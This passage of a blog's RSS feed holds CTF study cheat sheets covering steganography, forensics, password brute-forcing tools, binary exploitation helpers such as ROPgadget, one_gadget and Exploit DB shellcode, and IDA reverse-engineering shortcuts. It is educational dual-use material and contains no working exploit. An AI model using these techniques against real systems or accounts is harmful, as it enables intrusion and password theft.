[Maxim] *** ERROR // Long Msg: java.lang.UnsatisfiedLinkError: No implementation found for java.lang.ClassLoader s.h.e.l.l.N.al(java.lang.ClassLoader, android.content.pm.ApplicationInfo, java.lang.String, java.lang.String) (tried Java_s_h_e_l_l_N_al and Java_s_h_e_l_l_N_al__Ljava_lang_ClassLoader_2Landroid_content_pm_ApplicationInfo_2Ljava_lang_String_2Ljava_lang_String_2)
[Maxim] *** ERROR // Build Label: google/sdk_gphone64_x86_64/emulator64_x86_64_arm64:12/SE1A.211212.001.B1/8023802:user/release-keys
[Maxim] *** ERROR // Build Changelist: 8023802
[Maxim] *** ERROR // Build Time: 1640217878000
[Maxim] *** ERROR // java.lang.UnsatisfiedLinkError: No implementation found for java.lang.ClassLoader s.h.e.l.l.N.al(java.lang.ClassLoader, android.content.pm.ApplicationInfo, java.lang.String, java.lang.String) (tried Java_s_h_e_l_l_N_al and Java_s_h_e_l_l_N_al__Ljava_lang_ClassLoader_2Landroid_content_pm_ApplicationInfo_2Ljava_lang_String_2Ljava_lang_String_2)
// at s.h.e.l.l.N.al(Native Method)
// at s.h.e.l.l.A.instantiateApplication(Unknown Source:45)
// at android.app.Instrumentation.newApplication(Instrumentation.java:1177)
// at android.app.LoadedApk.makeApplication(LoadedApk.java:1356)
// at android.app.ActivityThread.handleBindApplication(ActivityThread.java:6686)
// at android.app.ActivityThread.access$1500(ActivityThread.java:247)
// at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2053)
// at android.os.Handler.dispatchMessage(Handler.java:106)
// at android.os.Looper.loopOnce(Looper.java:201)
// at android.os.Looper.loop(Looper.java:288)
// at android.app.ActivityThread.main(ActivityThread.java:7839)
// at java.lang.reflect.Method.invoke(Native Method)
// at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
// at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1003)
//
&lt;/code>&lt;/pre></description></item><item><title>Misc Cheat Sheet</title><link>https://bernie6401.github.io/tools/ctf/misc-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/misc-cheat-sheet/</guid><description>&lt;h1 id="misc-cheat-sheet">
 Misc Cheat Sheet
 &lt;a class="anchor" href="#misc-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="online-tools">
 Online Tools
 &lt;a class="anchor" href="#online-tools">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Encode &amp;amp; Decode&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://online-barcode-reader.inliteresearch.com/">Free Online Barcode Reader&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://products.aspose.app/barcode/recognize/qr#/recognized">QR Code Barcode Reader Online&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://emn178.github.io/online-tools/index.html">Encoding&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://roar.iiilab.com/">獸語&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="check-file-info">
 Check file info
 &lt;a class="anchor" href="#check-file-info">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ binwalk [-e] [filename] # or binwalk --dd=&amp;#34;.*&amp;#34; [filename]
$ exiftool [filename]
$ pngcheck [filename]
$ stat [filename]
$ file [filename]
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>$ binwalk -e&lt;/code> 的範例可以參考&lt;a href="https://hackmd.io/@SBK6401/BJgwrxWM6#Electric-Steel">Deadface - Electric Steel &lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="steganography">
 Steganography
 &lt;a class="anchor" href="#steganography">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>text: &lt;a href="https://github.com/zed-0xff/zsteg">zsteg&lt;/a>(just for &lt;code>bmp&lt;/code> and &lt;code>png&lt;/code> files), &lt;a href="http://quickcrypto.com/download.html">Quick Crypto&lt;/a>&lt;/li>
&lt;li>file: steghide(&lt;code>sudo apt-get install steghide&lt;/code>)(&lt;code>$ steghide extract -sf atbash.jpg&lt;/code>)&lt;/li>
&lt;li>進階的steghide$\to$&lt;a href="https://github.com/RickdeJager/stegseek">stegseek&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo apt install ./stegseek_0.6-1.deb -y
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ stegseek &lt;span style="color:#f92672">[&lt;/span>stegofile.jpg&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>wordlist.txt&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="disk-analysis">
 Disk Analysis
 &lt;a class="anchor" href="#disk-analysis">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://darkranger.no-ip.org/archives/v5/document/linux/foremost_recovery.htm">Foremost&lt;/a>: 針對所支援的檔案結構去進行資料搜尋與救援
&lt;code>$ foremost -v {filename}&lt;/code>&lt;/li>
&lt;li>&lt;a href="https://blog.csdn.net/wxh0000mm/article/details/99447206">Sleuth kit/Autopsy&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.exterro.com/ftk-imager">FTK Imager&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@SBK6401/SJOwGrUfa">Logontracer&lt;/a>: Just use GUI to present event log traced on windows
&lt;code>$ python logontracer.py -r -o 8000 -u neo4j -p neo4j -s localhost&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="memory-forensics">
 Memory Forensics
 &lt;a class="anchor" href="#memory-forensics">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>建議直接使用&lt;a href="https://www.volatilityfoundation.org/releases">windown protable version&lt;/a>會比較穩定而且不需要處理環境的問題&lt;/li>
&lt;li>&lt;a href="https://hackmd.io/@TuX-/BymMpKd0s">Volatility - Cheat Sheet&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/volatilityfoundation/volatility3">Volatility 3&lt;/a>
:::spoiler Set up &amp;amp; How2Use
&lt;a href="https://blog.csdn.net/u011250160/article/details/120461405">Windows Volatility 3 Problems &amp;amp; Solutions&lt;/a>
&lt;a href="https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html">Windows Set up Tutorials&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/volatilityfoundation/volatility3
$ cd volatility3
$ pip install -r requirement.txt
$ python vol.py -f &amp;lt;path to memory image&amp;gt; plugin_name plugin_option
$ python vol.py -h # For help
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>&lt;a href="https://github.com/volatilityfoundation/volatility">Volatility 2&lt;/a>
:::spoiler Set up &amp;amp; How2Use
&lt;a href="https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html">Windows Set up Tutorials&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ conda create --name py27 python=2.7
$ conda activate py27
$ git clone https://github.com/volatilityfoundation/volatility
$ cd volatility
$ pip install pycrypto
$ pip install distorm3
$ python vol.py -f &amp;lt;path to memory image&amp;gt; plugin_name plugin_option
$ python vol.py -h # For help
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;/ul>
&lt;h2 id="package">
 Package
 &lt;a class="anchor" href="#package">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://packetlife.net/blog/2008/oct/18/cheat-sheets-tcpdump-and-wireshark/">Wireshark cheat sheet&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.osslab.tw/books/linux-administration/page/nmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E9%9B%86">&lt;code>nmap&lt;/code>&lt;/a>:
&lt;code>$ sudo apt-get install nmap&lt;/code>&lt;/li>
&lt;li>&lt;a href="https://www.ibm.com/docs/zh-tw/aix/7.3?topic=n-ntpdc4-command">&lt;code>ntpdc&lt;/code>&lt;/a>
&lt;code>$ sudo apt-get install ntpdc&lt;/code>&lt;/li>
&lt;li>tcpflow
&lt;code>$ sudo tcpflow -r {pcap file}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="brute-force-password">
 Brute Force Password
 &lt;a class="anchor" href="#brute-force-password">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>for WPA/Wifi based: &lt;a href="https://linuxhint.com/install_aircrack-ng_ubuntu/">&lt;code>aircrack-ng&lt;/code>&lt;/a>, &lt;a href="https://ithelp.ithome.com.tw/articles/10280928">Wifite&lt;/a>&lt;/li>
&lt;li>for system user: &lt;a href="https://ithelp.ithome.com.tw/articles/10300529">John the Ripper&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="sound">
 Sound
 &lt;a class="anchor" href="#sound">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>hide files: &lt;a href="https://www.petitcolas.net/steganography/mp3stego/">MP3stego&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ./encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./decode -X -P pass svega_stego.mp3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sound to image:
&lt;ul>
&lt;li>&lt;a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04">How to convert a SSTV audio file to images using QSSTV - en&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.srcmini.com/62326.html">How to convert a SSTV audio file to images using QSSTV - zh-cn&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>hide message: &lt;a href="https://sourceforge.net/projects/silenteye/">silenteye&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="mail">
 Mail
 &lt;a class="anchor" href="#mail">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://goldfynch.com/goldfynch-pst-viewer">PST Viewer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://products.groupdocs.app/zh-hant/viewer/eml">eml Viewer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.thunderbird.net/zh-TW/">ThunderBird Client&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="overall">
 Overall
 &lt;a class="anchor" href="#overall">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://aperisolve.fr/">All stego decrypt tools&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://tools.miku.ac/">All stego encrypt tools&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.ctftools.com/">ctf tool&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://w1a2d3s4q5e6.blogspot.com/2016/06/blog-post.html">Other people&amp;rsquo;s note&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>PWN Overview</title><link>https://bernie6401.github.io/tools/ctf/pwn-overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/pwn-overview/</guid><description>&lt;h1 id="pwn-overview">
 PWN Overview
 &lt;a class="anchor" href="#pwn-overview">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools-cheat">
 Tools Cheat
 &lt;a class="anchor" href="#tools-cheat">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Commonly Used Commands
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ file {file path}
$ checksec {file path} # sudo apt-get install checksec
$ objdump -M intel -d {file path} | less
$ gdb {file path} # sudo apt-get install gdb
$ readelf -a {file path} | less # 查看所有資訊，包含section/file-header/program headers/symbol tables/等等
$ readelf -S {file path} # 只查看sections&amp;#39; header
$ ldd {file path} # to check what libraries the file used
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Command Used Tools / Plugin
&lt;ul>
&lt;li>&lt;a href="https://github.com/longld/peda">gdb-peda&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/longld/peda.git ~/peda
$ echo &amp;#34;source ~/peda/peda.py&amp;#34; &amp;gt;&amp;gt; ~/.gdbinit
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://github.com/radareorg/radare2">radare2&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/radare/radare2.git
$ sudo apt install build-essential # just for wsl
$ sudo ./radare2/sys/install.sh
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://www.exploit-db.com/shellcodes">Exploit DB - Shell Code&lt;/a>：如果要寫shell code的話可以直接看exploit db上別人寫好的gadget，複製起來就可以用了，不過有時候也有可能會失敗，在確認其他東西都是正確的情況下，可以試看看別的，記得平台要選對&lt;/li>
&lt;li>&lt;a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install python3-pip
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo -H python3 -m pip install ROPgadget
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --help
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># For using&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> | grep &lt;span style="color:#e6db74">&amp;#39;pop rax.*ret&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Or&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --only &lt;span style="color:#e6db74">&amp;#34;pop|ret|syscall&amp;#34;&lt;/span> &amp;gt; rop_gadget.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --only &lt;span style="color:#e6db74">&amp;#34;pop|ret|syscall&amp;#34;&lt;/span> --multibr &amp;gt; rop_gadget.txt &lt;span style="color:#75715e"># multibr是multi bransh允許多分支的gadget&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 取得特定string的gadget&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --string &lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>&lt;a href="https://github.com/david942j/one_gadget">one_gadget&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install rubygems
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo gem install one_gadget
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ one_gadget &lt;span style="color:#f92672">{&lt;/span>libc file&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>seccomp-tools
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install gcc ruby-dev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ gem install seccomp-tools
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ seccomp-tools dump ./test
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>找glibc版本的online tool
&lt;a href="https://libc.rip/">libc-database search API Search&lt;/a>
&lt;a href="https://libc.blukat.me/?q=__libc_start_main_ret">libc database search&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="gdb">
 gdb
 &lt;a class="anchor" href="#gdb">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler 常用語法(&lt;a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">cheat&lt;/a>)&lt;/p></description></item><item><title>Real World Tools</title><link>https://bernie6401.github.io/tools/others/real-world-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/real-world-tools/</guid><description>&lt;h1 id="real-world-tools">
 Real World Tools
 &lt;a class="anchor" href="#real-world-tools">#&lt;/a>
&lt;/h1>
&lt;h2 id="kali-linux">
 Kali-Linux
 &lt;a class="anchor" href="#kali-linux">#&lt;/a>
&lt;/h2>
&lt;p>有關Kali的所有工具可以直接參考&lt;a href="https://www.researchgate.net/profile/Syed-Zain-Ul-Hassan-2/publication/369305777_Operating_Systems_for_Ethical_Hackers_-_A_Platform_Comparison_of_Kali_Linux_and_Parrot_OS/links/6414544c315dfb4cce89b6a3/Operating-Systems-for-Ethical-Hackers-A-Platform-Comparison-of-Kali-Linux-and-Parrot-OS.pdf">Operating Systems for Ethical Hackers - A Platform Comparison of Kali Linux and Parrot OS&lt;/a>
:::info
ul Hassan, S. Z., Muzaffar, Z., &amp;amp; Ahmad, S. Z. (2021). Operating Systems for Ethical Hackers-A Platform Comparison of Kali Linux and Parrot OS. International Journal, 10(3).
:::
裡面有詳細分類&lt;/p>
&lt;ul>
&lt;li>Information Gathering Tools(67)&lt;/li>
&lt;li>Vulnerability Analysis Tools(27)&lt;/li>
&lt;li>Exploitation Tools(21)&lt;/li>
&lt;li>Wireless Attacks Tools(54)&lt;/li>
&lt;li>Forensics Tools(23)&lt;/li>
&lt;li>Web Applications tools(43)&lt;/li>
&lt;li>Stress Testing tools(14)&lt;/li>
&lt;li>Sniffing &amp;amp; Spoofing Tools(33)&lt;/li>
&lt;li>Password Attacks Tools(39)&lt;/li>
&lt;li>Maintaining Access Tools(17)&lt;/li>
&lt;li>Reverse Engineering Tools(11)&lt;/li>
&lt;li>Reporting Tools(10)&lt;/li>
&lt;li>Hardware Hacking(6)&lt;/li>
&lt;li>Some Parrot OS in-built tools(20)&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.exploit-db.com/google-hacking-database">Google Hacking&lt;/a>
:::spoiler Description&lt;/p></description></item><item><title>Reverse Overview</title><link>https://bernie6401.github.io/tools/ctf/reverse-overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/reverse-overview/</guid><description>&lt;h1 id="reverse-overview">
 Reverse Overview
 &lt;a class="anchor" href="#reverse-overview">#&lt;/a>
&lt;/h1>
&lt;h2 id="tools">
 Tools
 &lt;a class="anchor" href="#tools">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Type&lt;/th>
 &lt;th>App&lt;/th>
 &lt;th>.NET&lt;/th>
 &lt;th>x86/x64&lt;/th>
 &lt;th>Packer&lt;/th>
 &lt;th>Python&lt;/th>
 &lt;th>C&lt;/th>
 &lt;th>General&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>Description&lt;/td>
 &lt;td>&lt;li> MobSF: Must run in python &lt;code>3.8&lt;/code>&lt;/li>&lt;li>ApkTool: Just follow the step in &lt;a href="https://apktool.org/docs/install/">install guide&lt;/a>&lt;/li>&lt;/td>
 &lt;td>To decompile C#(.NET)&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>指令：&lt;code>$ upx -d {filename}&lt;/code>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>一個可以把組語轉換成c pseudo code的線上工具&lt;/td>
 &lt;td>一個線上的decompiler，結合多種工具，只要上傳檔案(小於2MB)就可以呈現多種decompiler tools的結果&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Link&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10215522">MobSF&lt;/a>&lt;/br>&lt;a href="https://apktool.org/">ApkTools&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://github.com/dnSpy/dnSpy/releases">dnSpy&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://carlosrafaelgn.com.br/Asm86/">x86模擬器&lt;/a>&lt;/br>&lt;a href="https://defuse.ca/online-x86-assembler.htm#disassembly">x86/x64 assembler/disassembler&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://github.com/upx/upx/releases/tag/v4.0.2">UPX Packer&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://tool.lu/pyc/">Pyc disassemble&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://godbolt.org/">Compiler Explorer&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://dogbolt.org/">Decompiler Explorer&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="ida-常用快捷鍵">
 IDA 常用快捷鍵
 &lt;a class="anchor" href="#ida-%e5%b8%b8%e7%94%a8%e5%bf%ab%e6%8d%b7%e9%8d%b5">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://blog.30cm.tw/2018/01/ida.html">IDA Interface&lt;/a>&lt;/li>
&lt;li>型別
&lt;ul>
&lt;li>char(1 byte)&lt;/li>
&lt;li>WORD(2 bytes)&lt;/li>
&lt;li>DWORD(4 bytes)&lt;/li>
&lt;li>PDWORD(pointer of DWORD = DWORD *)&lt;/li>
&lt;li>若是DWORD *name，代表name這個變數是一個pointer而且指向的地方是一個DWORD&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Space: 在 Text View / Graph View 切換&lt;/li>
&lt;li>Tab: 在視窗之間切換&lt;/li>
&lt;li>;/Insert: 註解&lt;/li>
&lt;li>x: 秀出 Xrefs&lt;/li>
&lt;li>n: 改名&lt;/li>
&lt;li>y: 改型別&lt;/li>
&lt;li>h: 改表示方式 (dec / hex)&lt;/li>
&lt;li>u: 取消定義&lt;/li>
&lt;li>a: 當成字串&lt;/li>
&lt;li>c: 當成code&lt;/li>
&lt;li>p: 當成function&lt;/li>
&lt;li>t: set sizeof(XXX)；如果已經確定目前的constant就是某個變數的length，那可以直接按t讓他變成sizeof(那個變數)
舉例：如果已經確定目前的&lt;code>0x238&lt;/code>就是&lt;code>PROCESSENTRY32W&lt;/code>的size，就可以直接這樣用，會變得比較清楚
:::spoiler 結果
&lt;img src="https://hackmd.io/_uploads/S1nruHTza.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/rkjwuBTza.png" alt="" />
:::&lt;/li>
&lt;li>Shift+F1: show出Local Type視窗
:::spoiler Local Types Screenshot
&lt;img src="https://hackmd.io/_uploads/S1ikDa5_n.png" alt="" />
:::&lt;/li>
&lt;li>Shift+F12: 開啟Strings視窗
:::spoiler Strings Screenshot
&lt;img src="https://hackmd.io/_uploads/HybvLzo_2.png" alt="" />
:::&lt;/li>
&lt;li>對某一個數值按m: ENUM這個功能就是在替換一些常見的windows API參數，讓原本的純數字可以用文字表示，這樣比較好懂API的操作，逆向會更順暢(補充說明：IDA有收錄很多MSDN上的一些API，他每一個參數表示的文字，例如&lt;a href="https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants">這一篇&lt;/a>底下有顯示很多Constant/value的對應，而正常情況下IDA會顯示的是value，如果要把它換成Constant文字的表達式就可以用到ENUM這個功能)，又例如:
目前已經知道&lt;code>CreateToolhelp32Snapshot(2, 0);&lt;/code>中的2的意義是&lt;code>TH32CS_SNAPPROCESS&lt;/code>(可以參考&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot#parameters">MSDN&lt;/a>)，此時就可以直接按m之後再選擇&lt;code>TH32CS_SNAPPROCESS&lt;/code>
:::spoiler
&lt;img src="https://hackmd.io/_uploads/B1Rn5Q6G6.png" alt="" />
:::&lt;/li>
&lt;li>\: 不顯示/顯示資料型別&lt;/li>
&lt;li>Alt+M/Ctrl+M: 前者是註冊書籤，後者是察看並選擇標籤，可以快速跑到標示的地址&lt;/li>
&lt;li>Ctrl+E: 如果是分析DLL file，可能會有很多不同的entry point，利用這個shortcut可以顯示目前有幾個entry point，很方便
:::spoiler
&lt;img src="https://hackmd.io/_uploads/ryJw-C6Ga.png" alt="" />
:::&lt;/li>
&lt;li>如何把bytes變成字串:
&lt;ul>
&lt;li>可以直接Alt+A
:::spoiler&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用&lt;code>Y&lt;/code>定義他的型別成&lt;code>int dword_2008[32]&lt;/code>，前面的int就看每一個字元是來決定，後面&lt;code>[32]&lt;/code>就代表有多少字元變成array；第二種方法就是直接按&lt;code>d&lt;/code>改變一個字元的型態變成int，然後在&lt;code>edit/Array&lt;/code>的地方可以叫出&lt;code>Convert to array&lt;/code>的視窗(如果前面沒有先用&lt;code>d&lt;/code>改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意)
&lt;img src="https://hackmd.io/_uploads/HJ3yvI-Ga.png" alt="" />
&lt;img src="https://hackmd.io/_uploads/r1A_8LWMa.png" alt="" />&lt;/li>
&lt;li>接著就是在&lt;code>Option/String literals&lt;/code>視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style
&lt;img src="https://hackmd.io/_uploads/SyQBP8Zfp.png" alt="" />
:::
:::spoiler 完整流程&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o
.rodata:0000000000002009 db 0
.rodata:000000000000200A db 0
.rodata:000000000000200B db 0
.rodata:000000000000200C db 4Ch ; L
.rodata:000000000000200D db 0
.rodata:000000000000200E db 0
.rodata:000000000000200F db 0
.rodata:0000000000002010 db 41h ; A
.rodata:0000000000002011 db 0
.rodata:0000000000002012 db 0
.rodata:0000000000002013 db 0
.rodata:0000000000002014 db 47h ; G
.rodata:0000000000002015 db 0
.rodata:0000000000002016 db 0
.rodata:0000000000002017 db 0
.rodata:0000000000002018 db 7Bh ; {
.rodata:0000000000002019 db 0
.rodata:000000000000201A db 0
.rodata:000000000000201B db 0
.rodata:000000000000201C db 68h ; h
.rodata:000000000000201D db 0
.rodata:000000000000201E db 0
.rodata:000000000000201F db 0
.rodata:0000000000002020 db 33h ; 3
.rodata:0000000000002021 db 0
.rodata:0000000000002022 db 0
.rodata:0000000000002023 db 0
.rodata:0000000000002024 db 31h ; 1
.rodata:0000000000002025 db 0
.rodata:0000000000002026 db 0
.rodata:0000000000002027 db 0
.rodata:0000000000002028 db 31h ; 1
.rodata:0000000000002029 db 0
.rodata:000000000000202A db 0
.rodata:000000000000202B db 0
.rodata:000000000000202C db 4Fh ; O
.rodata:000000000000202D db 0
.rodata:000000000000202E db 0
.rodata:000000000000202F db 0
.rodata:0000000000002030 db 5Fh ; _
.rodata:0000000000002031 db 0
.rodata:0000000000002032 db 0
.rodata:0000000000002033 db 0
.rodata:0000000000002034 db 72h ; r
.rodata:0000000000002035 db 0
.rodata:0000000000002036 db 0
.rodata:0000000000002037 db 0
.rodata:0000000000002038 db 65h ; e
.rodata:0000000000002039 db 0
.rodata:000000000000203A db 0
.rodata:000000000000203B db 0
.rodata:000000000000203C db 76h ; v
.rodata:000000000000203D db 0
.rodata:000000000000203E db 0
.rodata:000000000000203F db 0
.rodata:0000000000002040 db 65h ; e
.rodata:0000000000002041 db 0
.rodata:0000000000002042 db 0
.rodata:0000000000002043 db 0
.rodata:0000000000002044 db 72h ; r
.rodata:0000000000002045 db 0
.rodata:0000000000002046 db 0
.rodata:0000000000002047 db 0
